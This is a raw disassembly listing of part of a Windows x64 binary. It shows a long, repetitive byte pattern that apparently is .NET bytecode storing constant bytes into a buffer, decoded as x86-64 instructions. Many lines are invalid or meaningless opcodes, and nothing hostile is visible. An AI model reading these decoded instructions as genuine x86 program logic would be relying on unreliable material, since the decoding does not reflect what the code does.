   140003492:	00 52 12             	add    %dl,0x12(%rdx)
   140003495:	04 20                	add    $0x20,%al
   140003497:	3f                   	(bad)
   140003498:	01 00                	add    %eax,(%rax)
   14000349a:	00 58 1f             	add    %bl,0x1f(%rax)
   14000349d:	34 52                	xor    $0x52,%al
   14000349f:	12 04 20             	adc    (%rax,%riz,1),%al
   1400034a2:	40 01 00             	rex add %eax,(%rax)
   1400034a5:	00 58 1f             	add    %bl,0x1f(%rax)
   1400034a8:	53                   	push   %rbx
   1400034a9:	52                   	push   %rdx
   1400034aa:	12 04 20             	adc    (%rax,%riz,1),%al
   1400034ad:	41 01 00             	add    %eax,(%r8)
   1400034b0:	00 58 19             	add    %bl,0x19(%rax)
   1400034b3:	52                   	push   %rdx
   1400034b4:	12 04 20             	adc    (%rax,%riz,1),%al
   1400034b7:	42 01 00             	rex.X add %eax,(%rax)
   1400034ba:	00 58 1f             	add    %bl,0x1f(%rax)
   1400034bd:	48 52                	rex.W push %rdx
   1400034bf:	12 04 20             	adc    (%rax,%riz,1),%al
   1400034c2:	43 01 00             	rex.XB add %eax,(%r8)
   1400034c5:	00 58 20             	add    %bl,0x20(%rax)
   1400034c8:	93                   	xchg   %eax,%ebx
   1400034c9:	00 00                	add    %al,(%rax)
   1400034cb:	00 52 12             	add    %dl,0x12(%rdx)
   1400034ce:	04 20                	add    $0x20,%al
   1400034d0:	44 01 00             	add    %r8d,(%rax)
   1400034d3:	00 58 20             	add    %bl,0x20(%rax)
   1400034d6:	b4 00                	mov    $0x0,%ah
   1400034d8:	00 00                	add    %al,(%rax)
   1400034da:	52                   	push   %rdx
   1400034db:	12 04 20             	adc    (%rax,%riz,1),%al
   1400034de:	45 01 00             	add    %r8d,(%r8)
   1400034e1:	00 58 20             	add    %bl,0x20(%rax)
   1400034e4:	b8 00 00 00 52       	mov    $0x52000000,%eax
   1400034e9:	12 04 20             	adc    (%rax,%riz,1),%al
   1400034ec:	46 01 00             	rex.RX add %r8d,(%rax)
   1400034ef:	00 58 20             	add    %bl,0x20(%rax)
   1400034f2:	8e 00                	mov    (%rax),%es
   1400034f4:	00 00                	add    %al,(%rax)
   1400034f6:	52                   	push   %rdx
   1400034f7:	12 04 20             	adc    (%rax,%riz,1),%al
   1400034fa:	47 01 00             	rex.RXB add %r8d,(%r8)
   1400034fd:	00 58 1f             	add    %bl,0x1f(%rax)
   140003500:	27                   	(bad)
   140003501:	52                   	push   %rdx
   140003502:	12 04 20             	adc    (%rax,%riz,1),%al
   140003505:	48 01 00             	add    %rax,(%rax)
   140003508:	00 58 1f             	add    %bl,0x1f(%rax)
   14000350b:	6a 52                	push   $0x52
   14000350d:	12 04 20             	adc    (%rax,%riz,1),%al
   140003510:	49 01 00             	add    %rax,(%r8)
   140003513:	00 58 20             	add    %bl,0x20(%rax)
   140003516:	d8 00                	fadds  (%rax)
   140003518:	00 00                	add    %al,(%rax)
   14000351a:	52                   	push   %rdx
   14000351b:	12 04 20             	adc    (%rax,%riz,1),%al
   14000351e:	4a 01 00             	rex.WX add %rax,(%rax)
   140003521:	00 58 20             	add    %bl,0x20(%rax)
   140003524:	e6 00                	out    %al,$0x0
   140003526:	00 00                	add    %al,(%rax)
   140003528:	52                   	push   %rdx
   140003529:	12 04 20             	adc    (%rax,%riz,1),%al
   14000352c:	4b 01 00             	rex.WXB add %rax,(%r8)
   14000352f:	00 58 20             	add    %bl,0x20(%rax)
   140003532:	82                   	(bad)
   140003533:	00 00                	add    %al,(%rax)
   140003535:	00 52 12             	add    %dl,0x12(%rdx)
   140003538:	04 20                	add    $0x20,%al
   14000353a:	4c 01 00             	add    %r8,(%rax)
   14000353d:	00 58 20             	add    %bl,0x20(%rax)
   140003540:	91                   	xchg   %eax,%ecx
   140003541:	00 00                	add    %al,(%rax)
   140003543:	00 52 12             	add    %dl,0x12(%rdx)
   140003546:	04 20                	add    $0x20,%al
   140003548:	4d 01 00             	add    %r8,(%r8)
   14000354b:	00 58 1f             	add    %bl,0x1f(%rax)
   14000354e:	1b 52 12             	sbb    0x12(%rdx),%edx
   140003551:	04 20                	add    $0x20,%al
   140003553:	4e 01 00             	rex.WRX add %r8,(%rax)
   140003556:	00 58 20             	add    %bl,0x20(%rax)
   140003559:	ba 00 00 00 52       	mov    $0x52000000,%edx
   14000355e:	12 04 20             	adc    (%rax,%riz,1),%al
   140003561:	4f 01 00             	rex.WRXB add %r8,(%r8)
   140003564:	00 58 20             	add    %bl,0x20(%rax)
   140003567:	d1 00                	roll   $1,(%rax)
   140003569:	00 00                	add    %al,(%rax)
   14000356b:	52                   	push   %rdx
   14000356c:	12 04 20             	adc    (%rax,%riz,1),%al
   14000356f:	50                   	push   %rax
   140003570:	01 00                	add    %eax,(%rax)
   140003572:	00 58 20             	add    %bl,0x20(%rax)
   140003575:	f2 00 00             	repnz add %al,(%rax)
   140003578:	00 52 12             	add    %dl,0x12(%rdx)
   14000357b:	04 20                	add    $0x20,%al
   14000357d:	51                   	push   %rcx
   14000357e:	01 00                	add    %eax,(%rax)
   140003580:	00 58 1f             	add    %bl,0x1f(%rax)
   140003583:	4e 52                	rex.WRX push %rdx
   140003585:	12 04 20             	adc    (%rax,%riz,1),%al
   140003588:	52                   	push   %rdx
   140003589:	01 00                	add    %eax,(%rax)
   14000358b:	00 58 1f             	add    %bl,0x1f(%rax)
   14000358e:	2d 52 12 04 20       	sub    $0x20041252,%eax
   140003593:	53                   	push   %rbx
   140003594:	01 00                	add    %eax,(%rax)
   140003596:	00 58 20             	add    %bl,0x20(%rax)
   140003599:	ca 00 00             	lret   $0x0
   14000359c:	00 52 12             	add    %dl,0x12(%rdx)
   14000359f:	04 20                	add    $0x20,%al
   1400035a1:	54                   	push   %rsp
   1400035a2:	01 00                	add    %eax,(%rax)
   1400035a4:	00 58 20             	add    %bl,0x20(%rax)
   1400035a7:	f5                   	cmc
   1400035a8:	00 00                	add    %al,(%rax)
   1400035aa:	00 52 12             	add    %dl,0x12(%rdx)
   1400035ad:	04 20                	add    $0x20,%al
   1400035af:	55                   	push   %rbp
   1400035b0:	01 00                	add    %eax,(%rax)
   1400035b2:	00 58 1f             	add    %bl,0x1f(%rax)
   1400035b5:	26 52                	es push %rdx
   1400035b7:	12 04 20             	adc    (%rax,%riz,1),%al
   1400035ba:	56                   	push   %rsi
   1400035bb:	01 00                	add    %eax,(%rax)
   1400035bd:	00 58 1f             	add    %bl,0x1f(%rax)
   1400035c0:	74 52                	je     0x140003614
   1400035c2:	12 04 20             	adc    (%rax,%riz,1),%al
   1400035c5:	57                   	push   %rdi
   1400035c6:	01 00                	add    %eax,(%rax)
   1400035c8:	00 58 1f             	add    %bl,0x1f(%rax)
   1400035cb:	36 52                	ss push %rdx
   1400035cd:	12 04 20             	adc    (%rax,%riz,1),%al
   1400035d0:	58                   	pop    %rax
   1400035d1:	01 00                	add    %eax,(%rax)
   1400035d3:	00 58 20             	add    %bl,0x20(%rax)
   1400035d6:	dc 00                	faddl  (%rax)
   1400035d8:	00 00                	add    %al,(%rax)
   1400035da:	52                   	push   %rdx
   1400035db:	12 04 20             	adc    (%rax,%riz,1),%al
   1400035de:	59                   	pop    %rcx
   1400035df:	01 00                	add    %eax,(%rax)
   1400035e1:	00 58 1f             	add    %bl,0x1f(%rax)
   1400035e4:	2a 52 12             	sub    0x12(%rdx),%dl
   1400035e7:	04 20                	add    $0x20,%al
   1400035e9:	5a                   	pop    %rdx
   1400035ea:	01 00                	add    %eax,(%rax)
   1400035ec:	00 58 1f             	add    %bl,0x1f(%rax)
   1400035ef:	70 52                	jo     0x140003643
   1400035f1:	12 04 20             	adc    (%rax,%riz,1),%al
   1400035f4:	5b                   	pop    %rbx
   1400035f5:	01 00                	add    %eax,(%rax)
   1400035f7:	00 58 1f             	add    %bl,0x1f(%rax)
   1400035fa:	4a 52                	rex.WX push %rdx
   1400035fc:	12 04 20             	adc    (%rax,%riz,1),%al
   1400035ff:	5c                   	pop    %rsp
   140003600:	01 00                	add    %eax,(%rax)
   140003602:	00 58 1f             	add    %bl,0x1f(%rax)
   140003605:	52                   	push   %rdx
   140003606:	52                   	push   %rdx
   140003607:	12 04 20             	adc    (%rax,%riz,1),%al
   14000360a:	5d                   	pop    %rbp
   14000360b:	01 00                	add    %eax,(%rax)
   14000360d:	00 58 1f             	add    %bl,0x1f(%rax)
   140003610:	33 52 12             	xor    0x12(%rdx),%edx
   140003613:	04 20                	add    $0x20,%al
   140003615:	5e                   	pop    %rsi
   140003616:	01 00                	add    %eax,(%rax)
   140003618:	00 58 1f             	add    %bl,0x1f(%rax)
   14000361b:	21 52 12             	and    %edx,0x12(%rdx)
   14000361e:	04 20                	add    $0x20,%al
   140003620:	5f                   	pop    %rdi
   140003621:	01 00                	add    %eax,(%rax)
   140003623:	00 58 1f             	add    %bl,0x1f(%rax)
   140003626:	4c 52                	rex.WR push %rdx
   140003628:	12 04 20             	adc    (%rax,%riz,1),%al
   14000362b:	60                   	(bad)
   14000362c:	01 00                	add    %eax,(%rax)
   14000362e:	00 58 20             	add    %bl,0x20(%rax)
   140003631:	92                   	xchg   %eax,%edx
   140003632:	00 00                	add    %al,(%rax)
   140003634:	00 52 12             	add    %dl,0x12(%rdx)
   140003637:	04 20                	add    $0x20,%al
   140003639:	61                   	(bad)
   14000363a:	01 00                	add    %eax,(%rax)
   14000363c:	00 58 1f             	add    %bl,0x1f(%rax)
   14000363f:	3e 52                	ds push %rdx
   140003641:	12 04 20             	adc    (%rax,%riz,1),%al
   140003644:	62 01 00 00 58 1f    	vaddps (%r15),%xmm31,%xmm27
   14000364a:	69 52 12 04 20 63 01 	imul   $0x1632004,0x12(%rdx),%edx
   140003651:	00 00                	add    %al,(%rax)
   140003653:	58                   	pop    %rax
   140003654:	20 d9                	and    %bl,%cl
   140003656:	00 00                	add    %al,(%rax)
   140003658:	00 52 12             	add    %dl,0x12(%rdx)
   14000365b:	04 20                	add    $0x20,%al
   14000365d:	64 01 00             	add    %eax,%fs:(%rax)
   140003660:	00 58 1f             	add    %bl,0x1f(%rax)
   140003663:	52                   	push   %rdx
   140003664:	52                   	push   %rdx
   140003665:	12 04 20             	adc    (%rax,%riz,1),%al
   140003668:	65 01 00             	add    %eax,%gs:(%rax)
   14000366b:	00 58 1f             	add    %bl,0x1f(%rax)
   14000366e:	49 52                	rex.WB push %r10
   140003670:	12 04 20             	adc    (%rax,%riz,1),%al
   140003673:	66 01 00             	add    %ax,(%rax)
   140003676:	00 58 20             	add    %bl,0x20(%rax)
   140003679:	dd 00                	fldl   (%rax)
   14000367b:	00 00                	add    %al,(%rax)
   14000367d:	52                   	push   %rdx
   14000367e:	12 04 20             	adc    (%rax,%riz,1),%al
   140003681:	67 01 00             	add    %eax,(%eax)
   140003684:	00 58 1f             	add    %bl,0x1f(%rax)
   140003687:	5a                   	pop    %rdx
   140003688:	52                   	push   %rdx
   140003689:	12 04 20             	adc    (%rax,%riz,1),%al
   14000368c:	68 01 00 00 58       	push   $0x58000001
   140003691:	1f                   	(bad)
   140003692:	65 52                	gs push %rdx
   140003694:	12 04 20             	adc    (%rax,%riz,1),%al
   140003697:	69 01 00 00 58 1f    	imul   $0x1f580000,(%rcx),%eax
   14000369d:	0e                   	(bad)
   14000369e:	52                   	push   %rdx
   14000369f:	12 04 20             	adc    (%rax,%riz,1),%al
   1400036a2:	6a 01                	push   $0x1
   1400036a4:	00 00                	add    %al,(%rax)
   1400036a6:	58                   	pop    %rax
   1400036a7:	20 ee                	and    %ch,%dh
   1400036a9:	00 00                	add    %al,(%rax)
   1400036ab:	00 52 12             	add    %dl,0x12(%rdx)
   1400036ae:	04 20                	add    $0x20,%al
   1400036b0:	6b 01 00             	imul   $0x0,(%rcx),%eax
   1400036b3:	00 58 1f             	add    %bl,0x1f(%rax)
   1400036b6:	3d 52 12 04 20       	cmp    $0x20041252,%eax
   1400036bb:	6c                   	insb   (%dx),(%rdi)
   1400036bc:	01 00                	add    %eax,(%rax)
   1400036be:	00 58 20             	add    %bl,0x20(%rax)
   1400036c1:	a5                   	movsl  (%rsi),(%rdi)
   1400036c2:	00 00                	add    %al,(%rax)
   1400036c4:	00 52 12             	add    %dl,0x12(%rdx)
   1400036c7:	04 20                	add    $0x20,%al
   1400036c9:	6d                   	insl   (%dx),(%rdi)
   1400036ca:	01 00                	add    %eax,(%rax)
   1400036cc:	00 58 1f             	add    %bl,0x1f(%rax)
   1400036cf:	18 52 12             	sbb    %dl,0x12(%rdx)
   1400036d2:	04 20                	add    $0x20,%al
   1400036d4:	6e                   	outsb  (%rsi),(%dx)
   1400036d5:	01 00                	add    %eax,(%rax)
   1400036d7:	00 58 20             	add    %bl,0x20(%rax)
   1400036da:	8f 00                	pop    (%rax)
   1400036dc:	00 00                	add    %al,(%rax)
   1400036de:	52                   	push   %rdx
   1400036df:	12 04 20             	adc    (%rax,%riz,1),%al
   1400036e2:	6f                   	outsl  (%rsi),(%dx)
   1400036e3:	01 00                	add    %eax,(%rax)
   1400036e5:	00 58 1f             	add    %bl,0x1f(%rax)
   1400036e8:	72 52                	jb     0x14000373c
   1400036ea:	12 04 20             	adc    (%rax,%riz,1),%al
   1400036ed:	70 01                	jo     0x1400036f0
   1400036ef:	00 00                	add    %al,(%rax)
   1400036f1:	58                   	pop    %rax
   1400036f2:	1f                   	(bad)
   1400036f3:	69 52 12 04 20 71 01 	imul   $0x1712004,0x12(%rdx),%edx
   1400036fa:	00 00                	add    %al,(%rax)
   1400036fc:	58                   	pop    %rax
   1400036fd:	1f                   	(bad)
   1400036fe:	44 52                	rex.R push %rdx
   140003700:	12 04 20             	adc    (%rax,%riz,1),%al
   140003703:	72 01                	jb     0x140003706
   140003705:	00 00                	add    %al,(%rax)
   140003707:	58                   	pop    %rax
   140003708:	1f                   	(bad)
   140003709:	0b 52 12             	or     0x12(%rdx),%edx
   14000370c:	04 20                	add    $0x20,%al
   14000370e:	73 01                	jae    0x140003711
   140003710:	00 00                	add    %al,(%rax)
   140003712:	58                   	pop    %rax
   140003713:	1f                   	(bad)
   140003714:	71 52                	jno    0x140003768
   140003716:	12 04 20             	adc    (%rax,%riz,1),%al
   140003719:	74 01                	je     0x14000371c
   14000371b:	00 00                	add    %al,(%rax)
   14000371d:	58                   	pop    %rax
   14000371e:	1f                   	(bad)
   14000371f:	40 52                	rex push %rdx
   140003721:	12 04 20             	adc    (%rax,%riz,1),%al
   140003724:	75 01                	jne    0x140003727
   140003726:	00 00                	add    %al,(%rax)
   140003728:	58                   	pop    %rax
   140003729:	20 c7                	and    %al,%bh
   14000372b:	00 00                	add    %al,(%rax)
   14000372d:	00 52 12             	add    %dl,0x12(%rdx)
   140003730:	04 20                	add    $0x20,%al
   140003732:	76 01                	jbe    0x140003735
   140003734:	00 00                	add    %al,(%rax)
   140003736:	58                   	pop    %rax
   140003737:	1f                   	(bad)
   140003738:	3f                   	(bad)
   140003739:	52                   	push   %rdx
   14000373a:	12 04 20             	adc    (%rax,%riz,1),%al
   14000373d:	77 01                	ja     0x140003740
   14000373f:	00 00                	add    %al,(%rax)
   140003741:	58                   	pop    %rax
   140003742:	1f                   	(bad)
   140003743:	48 52                	rex.W push %rdx
   140003745:	12 04 20             	adc    (%rax,%riz,1),%al
   140003748:	78 01                	js     0x14000374b
   14000374a:	00 00                	add    %al,(%rax)
   14000374c:	58                   	pop    %rax
   14000374d:	1f                   	(bad)
   14000374e:	50                   	push   %rax
   14000374f:	52                   	push   %rdx
   140003750:	12 04 20             	adc    (%rax,%riz,1),%al
   140003753:	79 01                	jns    0x140003756
   140003755:	00 00                	add    %al,(%rax)
   140003757:	58                   	pop    %rax
   140003758:	1f                   	(bad)
   140003759:	7b 52                	jnp    0x1400037ad
   14000375b:	12 04 20             	adc    (%rax,%riz,1),%al
   14000375e:	7a 01                	jp     0x140003761
   140003760:	00 00                	add    %al,(%rax)
   140003762:	58                   	pop    %rax
   140003763:	1f                   	(bad)
   140003764:	24 52                	and    $0x52,%al
   140003766:	12 04 20             	adc    (%rax,%riz,1),%al
   140003769:	7b 01                	jnp    0x14000376c
   14000376b:	00 00                	add    %al,(%rax)
   14000376d:	58                   	pop    %rax
   14000376e:	18 52 12             	sbb    %dl,0x12(%rdx)
   140003771:	04 20                	add    $0x20,%al
   140003773:	7c 01                	jl     0x140003776
   140003775:	00 00                	add    %al,(%rax)
   140003777:	58                   	pop    %rax
   140003778:	1f                   	(bad)
   140003779:	21 52 12             	and    %edx,0x12(%rdx)
   14000377c:	04 20                	add    $0x20,%al
   14000377e:	7d 01                	jge    0x140003781
   140003780:	00 00                	add    %al,(%rax)
   140003782:	58                   	pop    %rax
   140003783:	20 84 00 00 00 52 12 	and    %al,0x12520000(%rax,%rax,1)
   14000378a:	04 20                	add    $0x20,%al
   14000378c:	7e 01                	jle    0x14000378f
   14000378e:	00 00                	add    %al,(%rax)
   140003790:	58                   	pop    %rax
   140003791:	20 df                	and    %bl,%bh
   140003793:	00 00                	add    %al,(%rax)
   140003795:	00 52 12             	add    %dl,0x12(%rdx)
   140003798:	04 20                	add    $0x20,%al
   14000379a:	7f 01                	jg     0x14000379d
   14000379c:	00 00                	add    %al,(%rax)
   14000379e:	58                   	pop    %rax
   14000379f:	20 a7 00 00 00 52    	and    %ah,0x52000000(%rdi)
   1400037a5:	12 04 20             	adc    (%rax,%riz,1),%al
   1400037a8:	80 01 00             	addb   $0x0,(%rcx)
   1400037ab:	00 58 20             	add    %bl,0x20(%rax)
   1400037ae:	f6 00 00             	testb  $0x0,(%rax)
   1400037b1:	00 52 12             	add    %dl,0x12(%rdx)
   1400037b4:	04 20                	add    $0x20,%al
   1400037b6:	81 01 00 00 58 1f    	addl   $0x1f580000,(%rcx)
   1400037bc:	29 52 12             	sub    %edx,0x12(%rdx)
   1400037bf:	04 20                	add    $0x20,%al
   1400037c1:	82                   	(bad)
   1400037c2:	01 00                	add    %eax,(%rax)
   1400037c4:	00 58 1f             	add    %bl,0x1f(%rax)
   1400037c7:	7f 52                	jg     0x14000381b
   1400037c9:	12 04 20             	adc    (%rax,%riz,1),%al
   1400037cc:	83 01 00             	addl   $0x0,(%rcx)
   1400037cf:	00 58 1f             	add    %bl,0x1f(%rax)
   1400037d2:	61                   	(bad)
   1400037d3:	52                   	push   %rdx
   1400037d4:	12 04 20             	adc    (%rax,%riz,1),%al
   1400037d7:	84 01                	test   %al,(%rcx)
   1400037d9:	00 00                	add    %al,(%rax)
   1400037db:	58                   	pop    %rax
   1400037dc:	1f                   	(bad)
   1400037dd:	2e 52                	cs push %rdx
   1400037df:	12 04 20             	adc    (%rax,%riz,1),%al
   1400037e2:	85 01                	test   %eax,(%rcx)
   1400037e4:	00 00                	add    %al,(%rax)
   1400037e6:	58                   	pop    %rax
   1400037e7:	20 cc                	and    %cl,%ah
   1400037e9:	00 00                	add    %al,(%rax)
   1400037eb:	00 52 12             	add    %dl,0x12(%rdx)
   1400037ee:	04 20                	add    $0x20,%al
   1400037f0:	86 01                	xchg   %al,(%rcx)
   1400037f2:	00 00                	add    %al,(%rax)
   1400037f4:	58                   	pop    %rax
   1400037f5:	1f                   	(bad)
   1400037f6:	71 52                	jno    0x14000384a
   1400037f8:	12 04 20             	adc    (%rax,%riz,1),%al
   1400037fb:	87 01                	xchg   %eax,(%rcx)
   1400037fd:	00 00                	add    %al,(%rax)
   1400037ff:	58                   	pop    %rax
   140003800:	20 ba 00 00 00 52    	and    %bh,0x52000000(%rdx)
   140003806:	12 04 20             	adc    (%rax,%riz,1),%al
   140003809:	88 01                	mov    %al,(%rcx)
   14000380b:	00 00                	add    %al,(%rax)
   14000380d:	58                   	pop    %rax
   14000380e:	1f                   	(bad)
   14000380f:	5a                   	pop    %rdx
   140003810:	52                   	push   %rdx
   140003811:	12 04 20             	adc    (%rax,%riz,1),%al
   140003814:	89 01                	mov    %eax,(%rcx)
   140003816:	00 00                	add    %al,(%rax)
   140003818:	58                   	pop    %rax
   140003819:	1f                   	(bad)
   14000381a:	6c                   	insb   (%dx),(%rdi)
   14000381b:	52                   	push   %rdx
   14000381c:	12 04 20             	adc    (%rax,%riz,1),%al
   14000381f:	8a 01                	mov    (%rcx),%al
   140003821:	00 00                	add    %al,(%rax)
   140003823:	58                   	pop    %rax
   140003824:	1f                   	(bad)
   140003825:	22 52 12             	and    0x12(%rdx),%dl
   140003828:	04 20                	add    $0x20,%al
   14000382a:	8b 01                	mov    (%rcx),%eax
   14000382c:	00 00                	add    %al,(%rax)
   14000382e:	58                   	pop    %rax
   14000382f:	1f                   	(bad)
   140003830:	54                   	push   %rsp
   140003831:	52                   	push   %rdx
   140003832:	12 04 20             	adc    (%rax,%riz,1),%al
   140003835:	8c 01                	mov    %es,(%rcx)
   140003837:	00 00                	add    %al,(%rax)
   140003839:	58                   	pop    %rax
   14000383a:	1f                   	(bad)
   14000383b:	7f 52                	jg     0x14000388f
   14000383d:	12 04 20             	adc    (%rax,%riz,1),%al
   140003840:	8d 01                	lea    (%rcx),%eax
   140003842:	00 00                	add    %al,(%rax)
   140003844:	58                   	pop    %rax
   140003845:	20 ca                	and    %cl,%dl
   140003847:	00 00                	add    %al,(%rax)
   140003849:	00 52 12             	add    %dl,0x12(%rdx)
   14000384c:	04 20                	add    $0x20,%al
   14000384e:	8e 01                	mov    (%rcx),%es
   140003850:	00 00                	add    %al,(%rax)
   140003852:	58                   	pop    %rax
   140003853:	20 99 00 00 00 52    	and    %bl,0x52000000(%rcx)
   140003859:	12 04 20             	adc    (%rax,%riz,1),%al
   14000385c:	8f 01                	pop    (%rcx)
   14000385e:	00 00                	add    %al,(%rax)
   140003860:	58                   	pop    %rax
   140003861:	1f                   	(bad)
   140003862:	1b 52 12             	sbb    0x12(%rdx),%edx
   140003865:	04 20                	add    $0x20,%al
   140003867:	90                   	nop
   140003868:	01 00                	add    %eax,(%rax)
   14000386a:	00 58 20             	add    %bl,0x20(%rax)
   14000386d:	ca 00 00             	lret   $0x0
   140003870:	00 52 12             	add    %dl,0x12(%rdx)
   140003873:	04 20                	add    $0x20,%al
   140003875:	91                   	xchg   %eax,%ecx
   140003876:	01 00                	add    %eax,(%rax)
   140003878:	00 58 1f             	add    %bl,0x1f(%rax)
   14000387b:	78 52                	js     0x1400038cf
   14000387d:	12 04 20             	adc    (%rax,%riz,1),%al
   140003880:	92                   	xchg   %eax,%edx
   140003881:	01 00                	add    %eax,(%rax)
   140003883:	00 58 1f             	add    %bl,0x1f(%rax)
   140003886:	46 52                	rex.RX push %rdx
   140003888:	12 04 20             	adc    (%rax,%riz,1),%al
   14000388b:	93                   	xchg   %eax,%ebx
   14000388c:	01 00                	add    %eax,(%rax)
   14000388e:	00 58 1f             	add    %bl,0x1f(%rax)
   140003891:	62 52 12 04 20       	(bad)
   140003896:	94                   	xchg   %eax,%esp
   140003897:	01 00                	add    %eax,(%rax)
   140003899:	00 58 1f             	add    %bl,0x1f(%rax)
   14000389c:	31 52 12             	xor    %edx,0x12(%rdx)
   14000389f:	04 20                	add    $0x20,%al
   1400038a1:	95                   	xchg   %eax,%ebp
   1400038a2:	01 00                	add    %eax,(%rax)
   1400038a4:	00 58 20             	add    %bl,0x20(%rax)
   1400038a7:	fb                   	sti
   1400038a8:	00 00                	add    %al,(%rax)
   1400038aa:	00 52 12             	add    %dl,0x12(%rdx)
   1400038ad:	04 20                	add    $0x20,%al
   1400038af:	96                   	xchg   %eax,%esi
   1400038b0:	01 00                	add    %eax,(%rax)
   1400038b2:	00 58 20             	add    %bl,0x20(%rax)
   1400038b5:	da 00                	fiaddl (%rax)
   1400038b7:	00 00                	add    %al,(%rax)
   1400038b9:	52                   	push   %rdx
   1400038ba:	12 04 20             	adc    (%rax,%riz,1),%al
   1400038bd:	97                   	xchg   %eax,%edi
   1400038be:	01 00                	add    %eax,(%rax)
   1400038c0:	00 58 1f             	add    %bl,0x1f(%rax)
   1400038c3:	49 52                	rex.WB push %r10
   1400038c5:	12 04 20             	adc    (%rax,%riz,1),%al
   1400038c8:	98                   	cwtl
   1400038c9:	01 00                	add    %eax,(%rax)
   1400038cb:	00 58 20             	add    %bl,0x20(%rax)
   1400038ce:	97                   	xchg   %eax,%edi
   1400038cf:	00 00                	add    %al,(%rax)
   1400038d1:	00 52 12             	add    %dl,0x12(%rdx)
   1400038d4:	04 20                	add    $0x20,%al
   1400038d6:	99                   	cltd
   1400038d7:	01 00                	add    %eax,(%rax)
   1400038d9:	00 58 20             	add    %bl,0x20(%rax)
   1400038dc:	a9 00 00 00 52       	test   $0x52000000,%eax
   1400038e1:	12 04 20             	adc    (%rax,%riz,1),%al
   1400038e4:	9a                   	(bad)
   1400038e5:	01 00                	add    %eax,(%rax)
   1400038e7:	00 58 1f             	add    %bl,0x1f(%rax)
   1400038ea:	7f 52                	jg     0x14000393e
   1400038ec:	12 04 20             	adc    (%rax,%riz,1),%al
   1400038ef:	9b                   	fwait
   1400038f0:	01 00                	add    %eax,(%rax)
   1400038f2:	00 58 1f             	add    %bl,0x1f(%rax)
   1400038f5:	4d 52                	rex.WRB push %r10
   1400038f7:	12 04 20             	adc    (%rax,%riz,1),%al
   1400038fa:	9c                   	pushf
   1400038fb:	01 00                	add    %eax,(%rax)
   1400038fd:	00 58 1f             	add    %bl,0x1f(%rax)
   140003900:	13 52 12             	adc    0x12(%rdx),%edx
   140003903:	04 20                	add    $0x20,%al
   140003905:	9d                   	popf
   140003906:	01 00                	add    %eax,(%rax)
   140003908:	00 58 20             	add    %bl,0x20(%rax)
   14000390b:	ed                   	in     (%dx),%eax
   14000390c:	00 00                	add    %al,(%rax)
   14000390e:	00 52 12             	add    %dl,0x12(%rdx)
   140003911:	04 20                	add    $0x20,%al
   140003913:	9e                   	sahf
   140003914:	01 00                	add    %eax,(%rax)
   140003916:	00 58 20             	add    %bl,0x20(%rax)
   140003919:	c3                   	ret
   14000391a:	00 00                	add    %al,(%rax)
   14000391c:	00 52 12             	add    %dl,0x12(%rdx)
   14000391f:	04 20                	add    $0x20,%al
   140003921:	9f                   	lahf
   140003922:	01 00                	add    %eax,(%rax)
   140003924:	00 58 1c             	add    %bl,0x1c(%rax)
   140003927:	52                   	push   %rdx
   140003928:	12 04 20             	adc    (%rax,%riz,1),%al
   14000392b:	a0 01 00 00 58 20 f5 	movabs 0xf52058000001,%al
   140003932:	00 00 
   140003934:	00 52 12             	add    %dl,0x12(%rdx)
   140003937:	04 20                	add    $0x20,%al
   140003939:	a1 01 00 00 58 1f 7b 	movabs 0x12527b1f58000001,%eax
   140003940:	52 12 
   140003942:	04 20                	add    $0x20,%al
   140003944:	a2 01 00 00 58 1f 09 	movabs %al,0x1252091f58000001
   14000394b:	52 12 
   14000394d:	04 20                	add    $0x20,%al
   14000394f:	a3 01 00 00 58 1f 36 	movabs %eax,0x1252361f58000001
   140003956:	52 12 
   140003958:	04 20                	add    $0x20,%al
   14000395a:	a4                   	movsb  (%rsi),(%rdi)
   14000395b:	01 00                	add    %eax,(%rax)
   14000395d:	00 58 20             	add    %bl,0x20(%rax)
   140003960:	94                   	xchg   %eax,%esp
   140003961:	00 00                	add    %al,(%rax)
   140003963:	00 52 12             	add    %dl,0x12(%rdx)
   140003966:	04 20                	add    $0x20,%al
   140003968:	a5                   	movsl  (%rsi),(%rdi)
   140003969:	01 00                	add    %eax,(%rax)
   14000396b:	00 58 20             	add    %bl,0x20(%rax)
   14000396e:	9b                   	fwait
   14000396f:	00 00                	add    %al,(%rax)
   140003971:	00 52 12             	add    %dl,0x12(%rdx)
   140003974:	04 20                	add    $0x20,%al
   140003976:	a6                   	cmpsb  (%rdi),(%rsi)
   140003977:	01 00                	add    %eax,(%rax)
   140003979:	00 58 20             	add    %bl,0x20(%rax)
   14000397c:	9e                   	sahf
   14000397d:	00 00                	add    %al,(%rax)
   14000397f:	00 52 12             	add    %dl,0x12(%rdx)
   140003982:	04 20                	add    $0x20,%al
   140003984:	a7                   	cmpsl  (%rdi),(%rsi)
   140003985:	01 00                	add    %eax,(%rax)
   140003987:	00 58 1f             	add    %bl,0x1f(%rax)
   14000398a:	61                   	(bad)
   14000398b:	52                   	push   %rdx
   14000398c:	12 04 20             	adc    (%rax,%riz,1),%al
   14000398f:	a8 01                	test   $0x1,%al
   140003991:	00 00                	add    %al,(%rax)
   140003993:	58                   	pop    %rax
   140003994:	1f                   	(bad)
   140003995:	3b 52 12             	cmp    0x12(%rdx),%edx
   140003998:	04 20                	add    $0x20,%al
   14000399a:	a9 01 00 00 58       	test   $0x58000001,%eax
   14000399f:	20 fd                	and    %bh,%ch
   1400039a1:	00 00                	add    %al,(%rax)
   1400039a3:	00 52 12             	add    %dl,0x12(%rdx)
   1400039a6:	04 20                	add    $0x20,%al
   1400039a8:	aa                   	stos   %al,(%rdi)
   1400039a9:	01 00                	add    %eax,(%rax)
   1400039ab:	00 58 20             	add    %bl,0x20(%rax)
   1400039ae:	cb                   	lret
   1400039af:	00 00                	add    %al,(%rax)
   1400039b1:	00 52 12             	add    %dl,0x12(%rdx)
   1400039b4:	04 20                	add    $0x20,%al
   1400039b6:	ab                   	stos   %eax,(%rdi)
   1400039b7:	01 00                	add    %eax,(%rax)
   1400039b9:	00 58 1f             	add    %bl,0x1f(%rax)
   1400039bc:	31 52 12             	xor    %edx,0x12(%rdx)
   1400039bf:	04 20                	add    $0x20,%al
   1400039c1:	ac                   	lods   (%rsi),%al
   1400039c2:	01 00                	add    %eax,(%rax)
   1400039c4:	00 58 20             	add    %bl,0x20(%rax)
   1400039c7:	c0 00 00             	rolb   $0x0,(%rax)
   1400039ca:	00 52 12             	add    %dl,0x12(%rdx)
   1400039cd:	04 20                	add    $0x20,%al
   1400039cf:	ad                   	lods   (%rsi),%eax
   1400039d0:	01 00                	add    %eax,(%rax)
